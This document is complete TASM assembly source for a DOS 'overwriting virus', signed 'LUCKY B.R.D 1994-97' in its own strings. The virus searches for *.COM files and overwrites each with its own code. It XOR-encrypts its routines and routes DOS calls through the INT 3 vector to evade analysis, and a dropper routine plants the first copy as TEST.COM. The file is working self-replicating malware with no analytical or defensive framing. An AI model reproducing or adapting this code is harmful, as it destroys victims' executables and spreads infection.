;TASM /M3


.model	medium
.286
v_length equ v_finish-v_start
cseg	segment
	assume	cs:cseg,ds:cseg,es:cseg,ss:cseg
	org	100h
v_start:
	mov	si, 100h
	mov	di, 900h
	mov	cx, v_length
	rep	movsb
	mov	si, offset find
	mov	di, offset find_end
	call	crypt
	call	find
	mov	si, offset find
	mov	di, offset find_end
	call	crypt
	retn
crypt:
	pusha
	mov	ax, si
crypt_byte:
	xor	byte ptr [si], al
	inc	si
	cmp	si, di
	jne	crypt_byte
	popa
	retn
find:
	cli
	neg	sp
	neg	sp
	sti
	sub	ax, ax
	mov	ds, ax
	mov	si, 3*4
	mov	di, offset old_int21
	movsw
	movsw
	mov	es, ax
	mov	si, 21h*4
	mov	di, 3*4
	cli
	movsw
	movsw
	sti
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	si, offset text
	mov	di, offset text_end
	call	crypt
	mov	ah, 4eh
	mov	dx, offset f_mask
	mov	si, offset f_mask
	mov	di, offset f_mask_end
	call	crypt
	int	3
	mov	si, offset f_mask
	mov	di, offset f_mask_end
	call	crypt
	jmp	check_this
next_file:
	int	3
check_this:
	jc	error_find
	mov	si, offset infect_file
	mov	di, offset infect_file_end
	call	crypt
	call	infect_file
	mov	si, offset infect_file
	mov	di, offset infect_file_end
	call	crypt
	mov	ah, 4fh
	jmp	next_file
error_find:
	mov	si, offset text
	mov	di, offset text_end
	call	crypt
	sub	ax, ax
	mov	es, ax
	mov	si, offset old_int21
	mov	di, 3*4
	cli
	movsw
	movsw
	sti
	push	cs
	pop	es
	retn
find_end:
infect_file:
	mov	si, offset find
	mov	di, offset find_end
	call	crypt
	pusha
	mov	dx, 9eh
	mov	ax, 3d02h
	int	3
	xchg	bx, ax
	mov	si, offset do_writing
	mov	di, offset do_writing_end
	call	crypt
	call	do_writing
	mov	si, offset do_writing
	mov	di, offset do_writing_end
	call	crypt
	mov	ah, 3eh
	int	3
	popa
	mov	si, offset find
	mov	di, offset find_end
	call	crypt
	retn
infect_file_end:
do_writing:
	mov	si, offset infect_file
	mov	di, offset infect_file_end
	call	crypt
	mov	ah, 40h
	mov	cx, v_length
	mov	dx, 900h
	int	3
	mov	si, offset infect_file
	mov	di, offset infect_file_end
	call	crypt
	retn
do_writing_end:
f_mask	db	"*.COM",0
f_mask_end:
text	db	"NEW OVERWRITING VIRUS"
	db	" BY -= LUCKY B.R.D 1994-97 =-"
text_end:
v_finish:
old_int21 dd	?
cseg	ends

data	segment
filename db	"TEST.COM",0
data	ends

main	segment
	assume	cs:main
crypt2:
	pusha
	mov	ax, si
crypt_byte2:
	xor	byte ptr [si], al
	inc	si
	cmp	si, di
	jne	crypt_byte2
	popa
	retn
start:
	assume	cs:main,ds:cseg,es:cseg
	mov	ax, cseg
	mov	ds, ax
	mov	si, offset find
	mov	di, offset find_end
	call	crypt2
	mov	si, offset infect_file
	mov	di, offset infect_file_end
	call	crypt2
	mov	si, offset do_writing
	mov	di, offset do_writing_end
	call	crypt2
	mov	si, offset f_mask
	mov	di, offset f_mask_end
	call	crypt2
	mov	si, offset text
	mov	di, offset text_end
	call	crypt2
	assume	ds:data
	mov	ax, data
	mov	ds, ax
	mov	dx, offset filename
	mov	ah, 3ch
	mov	cx, 100000b
	int	21h
	xchg	bx, ax
	assume	ds:cseg
	mov	ax, cseg
	mov	ds, ax
	mov	dx, 100h
	mov	ah, 40h
	mov	cx, v_length
	int	21h
	mov	ah, 3eh
	int	21h
	mov	ax, 4c00h
	int	21h
main	ends
	end	start
